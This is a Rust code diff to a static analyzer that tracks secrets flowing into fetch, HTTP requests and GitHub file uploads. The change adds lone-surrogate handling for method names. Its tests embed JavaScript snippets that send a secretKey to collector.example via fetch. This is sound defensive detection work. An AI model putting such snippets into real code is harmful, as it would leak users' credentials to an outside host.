@@ -7,6 +7,7 @@ mod reports;
 
 use oxc_ast::{AstKind, ast::*};
 use oxc_semantic::{Semantic, SymbolId};
+use oxc_str::JSStr;
 use std::collections::{HashMap, HashSet};
 
 const SECRET: u8 = 1;
@@ -22,19 +23,34 @@ pub(super) struct Leak {
     pub credential_file: bool,
 }
 
-fn member<'s, 'a>(expression: &'s Expression<'a>) -> Option<(&'s Expression<'a>, &'s str)> {
+/// A JavaScript name as its canonical WTF-8 bytes, which keep a name with lone
+/// surrogates distinct from every other name.
+type NameKey = Box<[u8]>;
+
+/// The object and property name of a member expression with a static name.
+///
+/// The name is the complete JavaScript string, so a name with lone surrogates
+/// stays distinct wherever it identifies a method, export or field.
+fn member<'s, 'a>(expression: &'s Expression<'a>) -> Option<(&'s Expression<'a>, JSStr<'s>)> {
     match expression.get_inner_expression() {
         Expression::StaticMemberExpression(value) => {
-            Some((&value.object, value.property.name.as_str()))
+            Some((&value.object, JSStr::from(value.property.name.as_str())))
         }
         Expression::ComputedMemberExpression(value) => {
             let Expression::StringLiteral(name) = value.expression.get_inner_expression() else {
                 return None;
             };
-            Some((&value.object, name.value.as_str()))
+            Some((&value.object, name.value))
         }
         _ => None,
     }
+}
+
+/// [`member`] for matching known names: a name with lone surrogates is no
+/// known name.
+fn named_member<'s, 'a>(expression: &'s Expression<'a>) -> Option<(&'s Expression<'a>, &'s str)> {
+    let (object, name) = member(expression)?;
+    Some((object, name.as_str()?))
 }
 
 fn callee<'s, 'a>(expression: &'s Expression<'a>) -> &'s Expression<'a> {
@@ -53,7 +69,7 @@ fn name<'s>(expression: &'s Expression<'_>) -> Option<&'s str> {
     expression
         .get_identifier_reference()
         .map(|value| value.name.as_str())
-        .or_else(|| member(expression).map(|(_, name)| name))
+        .or_else(|| member(expression).and_then(|(_, name)| name.as_str()))
 }
 
 fn secret_name(name: &str) -> bool {
@@ -94,7 +110,7 @@ struct Flow<'s, 'a> {
     semantic: &'s Semantic<'a>,
     parameters: HashMap<SymbolId, (u32, usize)>,
     callers: HashMap<u32, Vec<&'a CallExpression<'a>>>,
-    methods: HashMap<(u32, bool), HashMap<String, Option<u32>>>,
+    methods: HashMap<(u32, bool), HashMap<NameKey, Option<u32>>>,
     terminators: HashMap<u32, u32>,
     defaults: HashMap<SymbolId, &'a Expression<'a>>,
     iterations: HashMap<SymbolId, &'a Expression<'a>>,
@@ -206,7 +222,7 @@ impl<'s, 'a> Flow<'s, 'a> {
                 let (class, static_receiver) = self.class(object, 0)?;
                 self.methods
                     .get(&(class.span.start, static_receiver))?
-                    .get(name)
+                    .get(name.as_bytes())
                     .copied()
                     .flatten()
             }
@@ -269,7 +285,7 @@ impl<'s, 'a> Flow<'s, 'a> {
                 {
                     return 0;
                 }
-                if secret_name(name) {
+                if name.as_str().is_some_and(secret_name) {
                     return SECRET;
                 }
                 0
@@ -398,7 +414,7 @@ impl<'s, 'a> Flow<'s, 'a> {
     fn field<'e>(
         &self,
         expression: &'e Expression<'a>,
-        field: &str,
+        field: JSStr<'_>,
         depth: usize,
     ) -> Option<&'e Expression<'a>>
     where
@@ -423,7 +439,7 @@ impl<'s, 'a> Flow<'s, 'a> {
                     match property {
                         ObjectPropertyKind::ObjectProperty(property) => {
                             let key = property.key.static_name()?;
-                            if key == field {
+                            if key.as_js_str() == field {
                                 return Some(&property.value);
                             }
                         }
@@ -453,21 +469,25 @@ impl<'s, 'a> Flow<'s, 'a> {
             }
             return call.arguments.get(1)?.as_expression();
         }
-        if let Some((request, "write" | "end")) = member(function)
+        if let Some((request, "write" | "end")) = named_member(function)
             && self.http_request(request, 0)
         {
             return call.arguments.first()?.as_expression();
         }
-        let (repos, "createOrUpdateFileContents") = member(function)? else {
+        let (repos, "createOrUpdateFileContents") = named_member(function)? else {
             return None;
         };
-        let (rest, "repos") = member(repos)? else {
+        let (rest, "repos") = named_member(repos)? else {
             return None;
         };
-        let (_, "rest") = member(rest)? else {
+        let (_, "rest") = named_member(rest)? else {
             return None;
         };
-        self.field(call.arguments.first()?.as_expression()?, "content", 0)
+        self.field(
+            call.arguments.first()?.as_expression()?,
+            "content".into(),
+            0,
+        )
     }
 }
 
@@ -480,7 +500,7 @@ fn is_source_candidate(kind: AstKind<'_>) -> bool {
             secret_name(member.property.name.as_str()) || member.property.name == "env"
         }
         AstKind::ComputedMemberExpression(member) => {
-            matches!(member.expression.get_inner_expression(), Expression::StringLiteral(name) if secret_name(name.value.as_str()) || name.value == "env")
+            matches!(member.expression.get_inner_expression(), Expression::StringLiteral(name) if name.value.as_str().is_some_and(secret_name) || name.value == "env")
         }
         AstKind::CallExpression(call) => matches!(
             name(&call.callee),
@@ -532,7 +552,7 @@ fn build_flow<'s, 'a>(semantic: &'s Semantic<'a>) -> Flow<'s, 'a> {
                     flow.methods
                         .entry((class.span.start, method.r#static))
                         .or_default()
-                        .insert(name.into_owned(), target);
+                        .insert(name.as_js_str().as_bytes().into(), target);
                 }
             }
         }
@@ -551,7 +571,9 @@ fn build_flow<'s, 'a>(semantic: &'s Semantic<'a>) -> Flow<'s, 'a> {
                     && !flow
                         .methods
                         .get(&(class.span.start, true))
-                        .is_some_and(|methods| methods.contains_key(member.property.name.as_str()))
+                        .is_some_and(|methods| {
+                            methods.contains_key(member.property.name.as_str().as_bytes())
+                        })
                 {
                     continue;
                 }
@@ -593,7 +615,7 @@ fn build_flow<'s, 'a>(semantic: &'s Semantic<'a>) -> Flow<'s, 'a> {
     }
     for node in semantic.nodes().iter() {
         if let AstKind::CallExpression(call) = node.kind()
-            && let Some((object, "filter")) = member(&call.callee)
+            && let Some((object, "filter")) = named_member(&call.callee)
             && let Some(predicate) = call.arguments.first().and_then(Argument::as_expression)
         {
             let parameters = match predicate.get_inner_expression() {
@@ -610,14 +632,12 @@ fn build_flow<'s, 'a>(semantic: &'s Semantic<'a>) -> Flow<'s, 'a> {
             }
         }
         if let AstKind::ArrowFunctionExpression(function) = node.kind()
-            && function.expression
-            && let Some(Statement::ExpressionStatement(statement)) =
-                function.body.statements.first()
+            && let Some(expression) = function.get_expression()
         {
             flow.returns
                 .entry(function.span.start)
                 .or_default()
-                .push(&statement.expression);
+                .push(expression);
         }
     }
     for node in semantic.nodes().iter() {
@@ -643,7 +663,7 @@ fn build_flow<'s, 'a>(semantic: &'s Semantic<'a>) -> Flow<'s, 'a> {
 
 pub(super) fn analyze(semantic: &Semantic<'_>, facts: &mut super::bindings::CallFacts) {
     let has_sources = semantic.nodes().iter().any(|node| is_source_candidate(node.kind())
-        || matches!(node.kind(), AstKind::StringLiteral(value) if matches!(value.value.as_str(), "fs" | "node:fs" | "fs/promises" | "node:fs/promises")));
+        || matches!(node.kind(), AstKind::StringLiteral(value) if matches!(value.value.as_str(), Some("fs" | "node:fs" | "fs/promises" | "node:fs/promises"))));
     let has_operations = operations::has_candidates(semantic);
     let has_sink = semantic.nodes().iter().any(|node| match node.kind() {
         AstKind::CallExpression(call) => is_candidate(call),
@@ -676,8 +696,8 @@ pub(super) fn analyze(semantic: &Semantic<'_>, facts: &mut super::bindings::Call
         };
         flow.steps = MAX_STEPS;
         let value = if name(&call.callee) == Some("fetch") {
-            let headers = flow.field(payload, "headers", 0);
-            let body = flow.field(payload, "body", 0);
+            let headers = flow.field(payload, "headers".into(), 0);
+            let body = flow.field(payload, "body".into(), 0);
             headers.map_or(0, |value| flow.value(value, 0))
                 | body.map_or(0, |value| flow.value(value, 0))
         } else {
@@ -811,6 +831,22 @@ mod tests {
     fn unrelated_class_properties_do_not_hide_a_secret_upload() {
         assert!(leaks(
             "class Transport { static send(value) { fetch('https://collector.example', {body:value}); } } Transport.chunkSize = 100; function send(secretKey) { Transport.send(secretKey); }"
+        ));
+    }
+
+    // `\uD800` is a lone surrogate, which has no UTF-8 form, and `\\ud800` is the
+    // six-character text a lossy conversion would turn it into.
+    #[test]
+    fn a_method_named_with_a_lone_surrogate_still_links_a_secret_upload() {
+        assert!(leaks(
+            r#"class Transport { static ["\uD800"](value) { fetch('https://collector.example', {body:value}); } } function send(secretKey) { Transport["\uD800"](secretKey); }"#
+        ));
+    }
+
+    #[test]
+    fn a_method_named_with_a_lone_surrogate_stays_distinct_from_its_escaped_text() {
+        assert!(leaks(
+            r#"class Transport { static ["\uD800"](value) { fetch('https://collector.example', {body:value}); } static ["\\ud800"](value) { return value; } } function send(secretKey) { Transport["\uD800"](secretKey); }"#
         ));
     }
 
